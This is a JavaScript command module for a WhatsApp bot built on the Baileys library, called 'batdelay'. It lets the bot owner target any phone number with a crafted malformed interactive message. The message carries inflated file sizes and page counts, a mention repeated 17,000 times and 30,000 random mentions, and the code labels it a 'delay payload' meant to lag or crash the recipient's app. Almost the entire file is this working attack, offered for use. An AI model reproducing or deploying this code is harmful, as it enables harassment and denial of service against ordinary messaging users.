// commands/batdelay.js
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');

const PROTECTED_NUMBERS = ['2347072182960', '2349049636843'];

async function batdelayCommand(sock, chatId, message, args) {
    // Owner-only check
    if (!message.key.fromMe) {
        await sock.sendMessage(chatId, { text: "❌ *Owner Only Command*" }, { quoted: message });
        return;
    }

    // Check if args exists and has content
    if (!args || args.length === 0) {
        await sock.sendMessage(chatId, { 
            text: "🦇 *Bat Delay*\n\nUsage: .batdelay <number>\nExample: .batdelay 628123456789"
        }, { quoted: message });
        return;
    }

    // Get the first argument (the phone number)
    const targetNumber = args[0];
    
    // Validate target number
    if (!targetNumber) {
        await sock.sendMessage(chatId, { text: "❌ Please provide a valid phone number." }, { quoted: message });
        return;
    }

    const cleanNumber = targetNumber.replace(/[^0-9]/g, '');
    
    if (!cleanNumber || cleanNumber.length < 10) {
        await sock.sendMessage(chatId, { text: "❌ Invalid phone number format." }, { quoted: message });
        return;
    }
    
    if (PROTECTED_NUMBERS.includes(cleanNumber)) {
        await sock.sendMessage(chatId, { text: "🛡️ *Protected Number*\nThis number cannot be targeted." }, { quoted: message });
        return;
    }

    const target = cleanNumber + '@s.whatsapp.net';
    
    await sock.sendMessage(chatId, { text: `🦇 Sending delay payload to ${cleanNumber}...` }, { quoted: message });
    await sock.sendMessage(chatId, { react: { text: "🦇", key: message.key } });

    try {
        const messageContent = {
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                fileLength: "9999999999999",
                                pageCount: 1316134911,
                                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦",
                                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1726867151",
                                contactVcard: true,
                                jpegThumbnail: ""
                            },
                            hasMediaAttachment: true
                        },
                        body: {
                            text: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞.𝐜𝐨𝐦\n" + "@15056662003".repeat(17000)
                        },
                        nativeFlowMessage: {
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: "{ display_text: 'Iqbhalkeifer', url: 'https://youtube.com/@iqbhalkeifer25', merchant_url: 'https://youtube.com/@iqbhalkeifer25' }"
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{}"
                                }
                            ],
                            messageParamsJson: "{}"
                        },
                        contextInfo: {
                            mentionedJid: [
                                "15056662003@s.whatsapp.net",
                                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                            ],
                            forwardingScore: 1,
                            isForwarded: true,
                            fromMe: false,
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            quotedMessage: {
                                documentMessage: {
                                    url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                                    fileLength: "9999999999999",
                                    pageCount: 1316134911,
                                    mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                                    fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐯𝐬 𝐄𝐯𝐞𝐫𝐲𝐛𝐨𝐝𝐲",
                                    fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                                    directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                                    mediaKeyTimestamp: "1724474503",
                                    contactVcard: true,
                                    thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                                    thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                                    thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                                    jpegThumbnail: ""
                                }
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, messageContent, { participant: { jid: target } });
        
        await sock.sendMessage(chatId, { text: `✅ Delay payload delivered to ${cleanNumber}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "✅", key: message.key } });

    } catch (error) {
        console.error('[BatDelay]', error.message);
        await sock.sendMessage(chatId, { text: `❌ Failed: ${error.message}` }, { quoted: message });
        await sock.sendMessage(chatId, { react: { text: "❌", key: message.key } });
    }
}

module.exports = batdelayCommand;